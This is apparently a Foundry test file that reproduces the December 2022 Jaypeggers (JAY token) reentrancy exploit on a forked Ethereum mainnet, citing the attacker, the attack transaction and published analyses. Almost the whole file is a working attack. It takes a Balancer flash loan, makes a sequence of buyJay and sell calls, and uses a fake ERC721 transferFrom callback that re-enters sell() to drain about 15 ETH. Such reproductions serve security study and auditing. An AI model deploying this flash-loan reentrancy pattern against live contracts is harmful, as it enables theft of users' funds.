// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~15.32 ETH
// Attacker : 0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b
// Attack Contract : https://etherscan.io/address/0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340
// Vulnerable Contract : https://etherscan.io/address/0xf2919d1d80aff2940274014bef534f7791906ff2
// Attack Tx : https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf2919d1d80aff2940274014bef534f7791906ff2#code#L1115

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1608372475225866240
// Article Shashank : https://blog.solidityscan.com/jay-token-exploit-reentrancy-attack-d7a4923b6333
// Article Hypernative : https://www.hypernative.io/blog/jaypeggers-exploit

interface IJay {
    function buyJay(
        address[] memory erc721TokenAddress,
        uint256[] memory erc721Ids,
        address[] memory erc1155TokenAddress,
        uint256[] memory erc1155Ids,
        uint256[] memory erc1155Amounts
    ) external payable;
    function sell(uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is Test {
    IJay constant JAY_TOKEN = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    uint256 constant BORROWED_ETH = 72.5 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_288_199);
        // Adding labels to improve stack traces' readability
        vm.label(address(JAY_TOKEN), "JAY_TOKEN");
        vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(0xce88686553686DA562CE7Cea497CE749DA109f9F, "BALANCER_ProtocolFeesCollector");
    }

    function testExploit() public {
        // "Clean" contract's balance
        payable(address(0)).transfer(address(this).balance);
        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", address(this).balance, 18);

        // Setup flashloan parameters
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BORROWED_ETH;
        // The following value for "b" was used in the original exploit, but it is actually not required here
        bytes memory b =
            "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";

        // Execute the flashloan. It will return the funds in the `receiveFlashLoan()` callback
        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, b);

        emit log_named_decimal_uint("[End] Attacker ETH balance after exploit", address(this).balance, 18);
    }

    /*
     * Callback function called by the Balancer Vault during the flashloan
     */
    function receiveFlashLoan(
        IERC20[] memory, /* tokens*/
        uint256[] memory amounts,
        uint256[] memory, /*feeAmounts*/
        bytes memory /*userData*/
    ) external {
        require(msg.sender == address(BALANCER_VAULT));

        // Transfer WETH to ETH and start the attack
        WETH_TOKEN.withdraw(amounts[0]);

        JAY_TOKEN.buyJay{value: 22 ether}(
            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
        );

        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = address(this);

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0] = 0;

        JAY_TOKEN.buyJay{value: 50.5 ether}(
            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
        );
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));
        JAY_TOKEN.buyJay{value: 3.5 ether}(
            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
        );
        JAY_TOKEN.buyJay{value: 8 ether}(
            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
        );
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));

        // Repay the flashloan by depositing ETH for WETH and transferring it back to Balancer
        (bool success,) = address(WETH_TOKEN).call{value: BORROWED_ETH}("deposit");
        require(success, "Deposit failed");
        WETH_TOKEN.transfer(address(BALANCER_VAULT), BORROWED_ETH);
    }

    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 /*amount*/ ) external {
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this))); // reenter call JAY_TOKEN.sell
    }

    receive() external payable {}
}
